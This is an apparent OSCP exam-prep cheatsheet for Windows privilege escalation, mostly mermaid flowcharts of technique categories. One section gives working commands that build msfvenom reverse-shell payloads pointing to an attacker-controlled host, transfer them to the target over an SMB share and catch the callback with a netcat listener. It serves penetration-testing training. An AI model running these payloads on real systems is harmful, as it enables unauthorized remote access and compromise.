# OSCP-cheatsheet
OSCP cheatsheet (testing mermaid)




### Manual privilege escalation
```mermaid
%%{
  init: {
    "theme": "default",
    "themeVariables": {
      "background": "#ffffff",
      "lineColor": "#000000",
      "primaryColor": "#ffffff",
      "primaryBorderColor": "#000000",
      "fontSize": "14px"
    }
  }
}%%

flowchart TB
  accTitle: Service exploits
  accDescr: A flowchart showing the flow of service exploits with decision points and colored arrows.

  Start([Manual privilege escalation]) --> Service_Exploits[Service Exploits]
  Start([Manual privilege escalation]) --> Registry[Registry]
  Start([Manual privilege escalation]) --> Passwords[Passwords]
  Start([Manual privilege escalation]) --> Scheduled_Tasks[Scheduled Tasks]
  Start([Manual privilege escalation]) --> Insecure_GUI_Apps[Insecure GUI Apps]
  Start([Manual privilege escalation]) --> Startup_Apps[Startup Apps]
  Start([Manual privilege escalation]) --> Token_Impersonation[Token Impersonation]
  Start([Manual privilege escalation]) --> Privilege_Escalation_Scripts[Privilege Escalation Scripts]
  
  %% --- Node coloring ---
  classDef green fill:#1b6e2d,stroke:#59e078,color:#fff
  classDef yellow fill:#e6b800,stroke:#e6b800,color:#000

  class Service_Exploits yellow
  class Registry yellow
  class Passwords yellow
  class Scheduled_Tasks yellow
  class Insecure_GUI_Apps yellow
  class Startup_Apps yellow
  class Token_Impersonation yellow
  class Privilege_Escalation_Scripts yellow

  %% --- Link coloring ---
  %% linkStyle 0 stroke:#0f0,stroke-width:2px
```
#### 1- reverse shell generation and file transfer

download [[AccessChk]] as following 
kali side
```powershell
wget https://download.sysinternals.com/files/AccessChk.zip
```

unzip it 
```powershell
unzip AccessChk.zip
```

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=135 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=135 -f exe -o reverse.msi
```

**Start [file transfer using SMB server](file%20transfer%20using%20SMB%20server)**
**kali side**
```powershell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

On Windows (update the IP address with your Kali IP):
```powershell
#change C:\PrivEsc\reverse.exe to the target directory + file name
copy \\<% tp.frontmatter["LHOST"] %>\kali\reverse.exe C:\PrivEsc\reverse.exe
copy \\<% tp.frontmatter["LHOST"] %>\kali\reverse.msi C:\PrivEsc\reverse.msi

# tranfering accesschk.exe
copy \\<% tp.frontmatter["LHOST"] %>\kali\accesschk\accesschk.exe C:\PrivEsc\accesschk.exe
```

Test the reverse shell by setting up a netcat listener on Kali:
```powershell
sudo nc -nvlp 135
```

we can test the reverse.exe shell by running it:
```powershell
C:\PrivEsc\reverse.exe
```

#### 2- [Service Exploits](5-%20Templates/04%20Post%20Exploitation/02%20Windows%20privilege%20escalation/2-%20Service%20Exploits.md)
```mermaid
%%{
  init: {
    "theme": "default",
    "themeVariables": {
      "background": "#ffffff",
      "lineColor": "#000000",
      "primaryColor": "#ffffff",
      "primaryBorderColor": "#000000",
      "fontSize": "14px"
    }
  }
}%%

flowchart TB
  accTitle: Service exploits
  accDescr: A flowchart showing the flow of service exploits with decision points and colored arrows.

  Start([Manual privilege escalation]) --> Service_Exploits[Service Exploits]
  Service_Exploits --> Insecure_Service_Permissions[Insecure Service Permissions]
  Service_Exploits -->  Unquoted_Service_Path[Unquoted Service Path]
  Service_Exploits -->  Weak_Registry_Permissions[Weak Registry Permissions]
  Service_Exploits -->  Insecure_Service_Executables[Insecure Service Executables]
  %% --- Node coloring ---
  classDef green fill:#1b6e2d,stroke:#59e078,color:#fff
  classDef yellow fill:#e6b800,stroke:#e6b800,color:#000

  class Service_Exploits green
  class Insecure_Service_Permissions yellow
  class Unquoted_Service_Path yellow
  class Weak_Registry_Permissions yellow
  class Insecure_Service_Executables yellow
  %% --- Link coloring ---
  linkStyle 0 stroke:#0f0,stroke-width:2px
```


#### 3- [Registry](5-%20Templates/04%20Post%20Exploitation/02%20Windows%20privilege%20escalation/3-%20Registry.md)
```mermaid
%%{
  init: {
    "theme": "default",
    "themeVariables": {
      "background": "#ffffff",
      "lineColor": "#000000",
      "primaryColor": "#ffffff",
      "primaryBorderColor": "#000000",
      "fontSize": "14px"
    }
  }
}%%

flowchart TB
  accTitle: Service exploits
  accDescr: A flowchart showing the flow of service exploits with decision points and colored arrows.

  Start([Manual privilege escalation]) --> Registry[Registry]
  Registry --> AutoRuns[AutoRuns]
  Registry -->  AlwaysInstallElevated[AlwaysInstallElevated]

  %% --- Node coloring ---
  classDef green fill:#1b6e2d,stroke:#59e078,color:#fff
  classDef yellow fill:#e6b800,stroke:#e6b800,color:#000

  class Registry green
  class AutoRuns yellow
  class AlwaysInstallElevated yellow
  
  %% --- Link coloring ---
  linkStyle 0 stroke:#0f0,stroke-width:2px
```


#### 4- [Password](5-%20Templates/04%20Post%20Exploitation/02%20Windows%20privilege%20escalation/4-%20Password.md)
```mermaid
%%{
  init: {
    "theme": "default",
    "themeVariables": {
      "background": "#ffffff",
      "lineColor": "#000000",
      "primaryColor": "#ffffff",
      "primaryBorderColor": "#000000",
      "fontSize": "14px"
    }
  }
}%%

flowchart TB
  accTitle: Service exploits
  accDescr: A flowchart showing the flow of service exploits with decision points and colored arrows.

  Start([Manual privilege escalation]) --> Passwords[Passwords]
  Passwords --> Registry[Registry]
  Passwords -->  Saved_Creds[Saved Creds]
  Passwords -->  SAM[Security Account Manager SAM]

  %% --- Node coloring ---
  classDef green fill:#1b6e2d,stroke:#59e078,color:#fff
  classDef yellow fill:#e6b800,stroke:#e6b800,color:#000

  class Passwords green
  class Registry yellow
  class Saved_Creds yellow
  class SAM yellow
  
  %% --- Link coloring ---
  linkStyle 0 stroke:#0f0,stroke-width:2px
```



